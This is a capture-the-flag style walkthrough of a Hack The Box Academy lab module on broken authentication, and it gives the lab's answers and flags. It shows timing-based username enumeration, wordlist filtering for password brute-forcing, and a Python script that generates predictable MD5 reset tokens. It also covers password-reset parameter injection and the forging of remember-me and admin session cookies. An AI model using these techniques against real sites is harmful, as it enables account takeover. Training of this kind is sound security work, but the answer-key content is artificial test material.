# Broken Authentication
* Source: [Hack the Box: Academy](https://academy.hackthebox.com/)
* Module: Broken Authentication
* Tier: II
* Difficulty: Medium
* Category: Offensive
* Time estimate: 2 days
* Date: DD-MM-YYYY
* Author: [DjikstraCS](https://github.com/DjikstraCS)

---
## Default Credentials
### Question:
![](./attachments/Pasted%20image%2020220714094626.png)

*Hint: Look at the page title, and find the relevant list.*

![](./attachments/Pasted%20image%2020220724134517.png)

Google search for `webaccess hmi/scada software default credentials`.

![](./attachments/Pasted%20image%2020220724134636.png)

**Answer:** `advantech`

---
## Weak Bruteforce Protections
### Question 1:
![](./attachments/Pasted%20image%2020220714094738.png)

*Hint: Try to generate some failed login attempts.*

**Answer:** `40`

### Question 2:
![](./attachments/Pasted%20image%2020220714094940.png)

*Hint: This web server doesn't trust your IP!*

![](./attachments/Pasted%20image%2020220724155629.png)

**Answer:** `HTB{127001>31337}`

---
## Bruteforcing Usernames
### Question 1:
![](./attachments/Pasted%20image%2020220714095111.png)

*Hint: Try a short username wordlist from a resource covered in this section.*

![](./attachments/Pasted%20image%2020220725232351.png)

**Answer:** `puppet`

### Question 2:
![](./attachments/Pasted%20image%2020220714095158.png)

*Hint: Read the source of every response.*

![](./attachments/Pasted%20image%2020220725232804.png)

**Answer:** `ansible`

### Question 3:
![](./attachments/Pasted%20image%2020220714095208.png)

*Hint: The timing.py script is a good starting point!*

Make shure we are using `http` and not `https` in the script.

Run multiple times and do an average.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ sudo python3 timing.py ~/seclists/Usernames/top-usernames-shortlist.txt
[-] Checking account root foobar
[+] user root            took 0.169302
[-] Checking account admin foobar
[+] user admin           took 3.220492
[-] Checking account test foobar
[+] user test            took 1.196619
[-] Checking account guest foobar
[+] user guest           took 1.187376
[-] Checking account info foobar
[+] user info            took 1.182451
[-] Checking account adm foobar
[+] user adm             took 0.19524
[-] Checking account mysql foobar
[+] user mysql           took 1.207376
[-] Checking account user foobar
[+] user user            took 0.212822
[-] Checking account administrator foobar
[+] user administrator   took 0.188404
[-] Checking account oracle foobar
[+] user oracle          took 0.175722
[-] Checking account ftp foobar
[+] user ftp             took 0.16328
[-] Checking account pi foobar
[+] user pi              took 1.214804
[-] Checking account puppet foobar
[+] user puppet          took 1.225885
[-] Checking account ansible foobar
[+] user ansible         took 0.200087
[-] Checking account ec2-user foobar
[+] user ec2-user        took 0.215079
[-] Checking account vagrant foobar
[+] user vagrant         took 1.48877
[-] Checking account azureuser foobar
[+] user azureuser       took 3.209391
```

**Answer:** `vagrant`

### Question 4:
![](./attachments/Pasted%20image%2020220714095221.png)

*Hint: Remember that registration forms have differences from login ones.*

**Answer:** `user`

---
## Bruteforcing Passwords
### Question:
![](./attachments/Pasted%20image%2020220714095415.png)

*Hint: Start with a password that has maximum complexity (uppercase, lowercase, digit, special char) and start removing one character family at a time until you identify the password policy.*

The password needs to contain at least one upper case character and a number.

```bash
┌──(kali㉿kali)-[~]
└─$ grep '[[:upper:]]' seclists/Passwords/Leaked-Databases/rockyou-50.txt | grep -E '^.{2,12}$' | grep '[0-9]' > Downloads/custom_RockYou-50.txt

┌──(kali㉿kali)-[~]
└─$ wc Downloads/custom_RockYou-50.txt                   
 15  15 127 Downloads/custom_RockYou-50.txt
```

The list now contains 15 possible passwords.

![](./attachments/Pasted%20image%2020220726114016.png)

**Answer:** `ANGEL1`

---
## Predictable Reset Token
### Question 1:
![](./attachments/Pasted%20image%2020220714095614.png)

*Hint: Convert the displayed date to epoch time in milliseconds and use it in the script you will create.*

Python script: 
```python
#!/usr/bin/python3

from hashlib import md5
from time import time

# To have a wide window try to bruteforce starting from 1050 seconds ago till 1050 seconds after.
# Change now and username variables as needed. IMPORTANT! the value for now has to be epoch time
# stamp in milliseconds, example 1654627487000 and not epoch timestamp, example 1654627487.

now        = 1658997918000
start_time = now - 1050
end_time   = now + 1050
fail_text  = "Wrong token."
username   = "htbadmin"

# loop from start_time to now. + 1 is needed because of how range() works
for x in range(start_time, end_time + 1):
    # get token md5
    timestamp = str(x)
    md5_token = md5((username+timestamp).encode()).hexdigest()
    print(md5_token)
```

Run the script to make token list.

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ python3 reset_token_time_list.py > token_list.txt

┌──(kali㉿kali)-[~/Downloads]
└─$ ls
token_list.txt		reset_token_time_list.py
```

Fuzz with ZAP.

![](./attachments/Pasted%20image%2020220728105416.png)

After inserting it in the page:

![](./attachments/Pasted%20image%2020220728105504.png)

**Answer:** `HTB{uns4f3t0k3ns4r3uns4f3}`

### Question 2:
![](./attachments/Pasted%20image%2020220728110513.png)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "Njg3NDYyNzU3MzY1NzIzYTY4NzQ2Mjc1NzM2NTcyNDA2MTYzNjE2NDY1NmQ3OTJlNjg2MTYzNmI3NDY4NjU2MjZmNzgyZTY1NzUzYTc1NmU2MjcyNjU2MTZiNjE2MjZjNjU=" | base64 -d
687462757365723a687462757365724061636164656d792e6861636b746865626f782e65753a756e627265616b61626c65
```

![](./attachments/Pasted%20image%2020220728110700.png)

![](./attachments/Pasted%20image%2020220728110752.png)

User:pass `htbadmin:Njg3NDYyNjE2NDZkNjk2ZTNhNjg3NDYyNjE2NDZkNjk2ZTQwNjE2MzYxNjQ2NTZkNzkyZTY4NjE2MzZiNzQ2ODY1NjI2Zjc4MmU2NTc1M2E3NTZlNjI3MjY1NjE2YjYxNjI2YzY1`

![](./attachments/Pasted%20image%2020220728110449.png)

**Answer:** `HTB{4lw4y5ch3ck3nc0d1ng}`

---
## Guessable Answers
### Question:
![](./attachments/Pasted%20image%2020220714095705.png)

*Hint: Not all questions are guessable.*

[Color Wordlist](https://raw.githubusercontent.com/imsky/wordlists/master/adjectives/colors.txt)

Fuzz answer with ZAP.

![](./attachments/Pasted%20image%2020220728114522.png)

**Answer:** `HTB{gu3ss4bl3_4n5w3r5_4r3_gu3ss4bl3}`

---
## Username Injection
### Question:
![](./attachments/Pasted%20image%2020220714095804.png)

*Hint: Inspect the fields on all pages thoroughly, and try to re-use them.*

Catch password reset request and insert `&userid=htbadmin`.

![](./attachments/Pasted%20image%2020220728120901.png)

Now log in as `htbadmin` with the new password.

![](./attachments/Pasted%20image%2020220728121012.png)

**Answer:** `HTB{us3rn4m3_1nj3ct3d}`

---
## Bruteforcing Cookies
### Question 1:
![](./attachments/Pasted%20image%2020220714095910.png)

![](./attachments/Pasted%20image%2020220728123014.png)

![](./attachments/Pasted%20image%2020220728122902.png)

![](./attachments/Pasted%20image%2020220728123244.png)

![](./attachments/Pasted%20image%2020220728123340.png)

**Answer:** `HTB{mu1tist3p_3nc0d1ng_15_uns4f3}`

### Question 2:
![](./attachments/Pasted%20image%2020220714100001.png)

*Hint: Correct decoding is the key.*

[Decoded remember me token](https://gchq.github.io/CyberChef/#recipe=URL_Decode()From_Base64('A-Za-z0-9%2B/%3D',true,false)Zlib_Inflate(0,0,'Adaptive',false,false)&input=ZUp3ckxVNHRzc29vU1NvRjB0WkYlMkJUbXBWc1VscFNtcGVTWFdKWm01cVZhR1pxYVdCZ2FtbHFabUFFNGpEbGMlM0Q)

[New token](https://gchq.github.io/CyberChef/#recipe=Zlib_Deflate('Dynamic%20Huffman%20Coding')To_Base64('A-Za-z0-9%2B/%3D')URL_Encode(true)URL_Encode(true)&input=dXNlcjpodGJ1c2VyO3JvbGU6c3VwZXI7dGltZToxNjU5MDA1OTU2)

![](./attachments/Pasted%20image%2020220728131957.png)

**Answer:** `HTB{r3m3mb3r_r3m3mb3r}`

---
## Skill Assessment
### Question:
![](./attachments/Pasted%20image%2020220714100046.png)

Pass: ADn68LQfkavmHLfALDIR@1

![](./attachments/Pasted%20image%2020220728135855.png)

```bash
┌──(kali㉿kali)-[~]
└─$ grep -x '.\{20,200\}' seclists/Passwords/Leaked-Databases/rockyou.txt | grep '[$#@]' | grep '[0-9]$' | grep '[[:lower:]]' | grep '^[[:upper:]]' > custom_rockyou.txt
```

![](./attachments/Pasted%20image%2020220730225744.png)

Username `support.us`

![](./attachments/Pasted%20image%2020220730230346.png)

Password: `Mustang#firebird1995`

Cookie part:

![](Pasted%20image%2020220805184304.png)

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo "YWY2MTcyZGExZjM1M2E5YjliYmJhYWMzYWMxZWQ0YzQ6NDM0OTkwYzhhMjVkMmJlOTQ4NjM1NjFhZTk4YmQ2ODI" | base64 -d
af6172da1f353a9b9bbbaac3ac1ed4c4:434990c8a25d2be94863561ae98bd682base64: invalid input
```

![](./attachments/Pasted%20image%2020220804112444.png)

![](./attachments/Pasted%20image%2020220804112509.png)

User:role `support.us:support`

```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "admin" | md5sum                                                                                  
21232f297a57a5a743894a0e4a801fc3  -

┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "admin.us" | md5sum
5e2dea20edeb5de788969bd9d441aaa9  -

┌──(kali㉿kali)-[~/Downloads]
└─$ echo -n "5e2dea20edeb5de788969bd9d441aaa9:21232f297a57a5a743894a0e4a801fc3" | base64
NWUyZGVhMjBlZGViNWRlNzg4OTY5YmQ5ZDQ0MWFhYTk6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM=
```

Final cookie: `NWUyZGVhMjBlZGViNWRlNzg4OTY5YmQ5ZDQ0MWFhYTk6MjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzM%3D`

![](Pasted%20image%2020220805190101.png)

**Answer:** `HTB{1_br0k3_4uth_4_br34kf4st}`

---
**Tags:** [[Hack The Box Academy]]